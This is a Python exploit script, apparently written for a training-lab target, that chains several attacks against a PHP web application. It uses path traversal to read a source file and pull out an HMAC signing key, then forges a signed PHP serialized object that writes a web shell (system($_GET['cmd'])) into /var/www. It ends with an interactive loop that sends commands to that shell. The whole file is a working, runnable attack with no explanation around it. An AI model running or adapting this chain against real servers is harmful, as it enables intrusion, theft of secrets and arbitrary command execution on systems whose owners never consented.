#!/usr/bin/python3
import requests
import hashlib
import urllib
import base64
import string
import random
import json
import hmac
import sys

# lambda
_RED = '\x1b[1;31m'
_BLU = '\x1b[1;34m'
_GRE = '\x1b[1;32m'
_RST = '\x1b[0;0;0m'
success_message = lambda x: '{}[+]{} {}'.format(_GRE, _RST, x)
error_message = lambda x: '{}[-]{} {}'.format(_RED, _RST, x)
info_message = lambda x: '{}[*]{} {}'.format(_BLU, _RST, x)

class TokenGenerator(object):
    # Key
    key = None

    # Global variables
    payload_lenght = None
    path_length = None
    payload = '</pre><?php system($_GET["cmd"]); ?></pre>'
    path = None
    filename = None

    def __init__(self, key):
        self.payload_length = str(len(self.payload))
        self.key = key
        self.path = self.generate_path()
        self.path_length = str(len(self.path))

    def generate_path(self):
        pool = string.ascii_uppercase + string.ascii_lowercase
        self.filename = ''.join(random.choice(pool) for _ in range (50)) + '.php'
        return '/var/www/' + self.filename

    def serialize(self):
        obj = ''
        obj += 'O:4:"File":3:{s:5:"owner";N;s:4:"uuid";s:' + self.payload_length
        obj += ':"' + self.payload + '";s:7:"logfile";s:' + self.path_length
        obj += ':"' + self.path + '";}'
        return obj

    def sign(self, token):
        return hmac.new(self.key.encode('utf-8'), msg=token.encode('utf-8'), digestmod=hashlib.md5).hexdigest()

    def generate_token(self):
        token = self.serialize()
        token = base64.b64encode(token.encode('utf-8'))
        token = urllib.parse.quote_plus(token)
        token += '--' + str(self.sign(token))
        return token

# Generating a user
print(info_message('Generating both username and password ...'))
pool = string.ascii_uppercase + string.ascii_lowercase
username = ''.join(random.choice(pool) for _ in range (15))
pool += string.digits
password = ''.join(random.choice(pool) for _ in range (15))

print(info_message('Current username: {}'.format(username)))
print(info_message('Current password: {}\n'.format(password)))

# We create an account
print(info_message('Trying to create the user ...'))
payload = {
    'username': username,
    'password': password
}
header = {'Content-Type': 'application/json'}
url = 'http://ptl-37b67296-52ce5743.libcurl.so/register'
resp = requests.post(url, data=json.dumps(payload), headers=header)
if resp.status_code != 200:
    print(error_message('Ouups something goes wrong!'))
    sys.exit(1)

print(success_message('User successfully created!'))
token = json.loads(resp.text)['token']
print(info_message('User token:'))
print('\t{}\n'.format(token))

# Retrieving /etc/passwd
print(info_message('Trying to get the key of the hashing function ...'))
path = '../../../'
uuid = 'var/www/classes/utils.php'
while True:
    payload = {
        'token': token,
        'uuid': path + uuid,
        'sig': 0
    }
    url = 'http://ptl-37b67296-52ce5743.libcurl.so/file'
    resp = requests.post(url, data=json.dumps(payload), headers=header)
    if resp.status_code != 200:
        print(error_message('Ouups something goes wrong'))
        sys.exit(1)
    
    if 'error' in resp.text:
        path += '../'
    else:
        break

print(success_message('Key sucessfully found!'))
key = resp.text
key = key.split("ndefine(\'KEY\', \\\"")[1]
key = key.split('\\");\\n\\n')[0]
print(info_message('Key: {}\n'.format(key)))

# Generate the evil token
print(info_message('Generating the evil token ...'))
generator = TokenGenerator(key)
token = generator.generate_token()
print(info_message('Token :'))
print('\t{}\n'.format(token))

print(info_message('Generating the file in the remote system ...'))
payload = {
    'token': token,
    'username': username,
    'password': username
}
header = {'Content-Type': 'application/json'}
url = 'http://ptl-37b67296-52ce5743.libcurl.so/register'

resp = requests.post(url, data=json.dumps(payload), headers=header)
if resp.status_code != 200:
    print(error_message('Ouuups something goes wrong!'))
    sys.exit(1)

print(success_message('File sucessfully generated!\n'))

print(info_message('Interacting with the webshell ...'))
url = 'http://ptl-37b67296-52ce5743.libcurl.so/' + generator.filename
print(info_message('Target: {}\n'.format(url)))
while True:
    cmd = input('cmd> ')

    if cmd == 'exit' or cmd == 'quit':
        break

    if cmd == '' or cmd == ' ':
        continue

    resp = requests.get(url + '?cmd=' + cmd)
    print(resp.text)
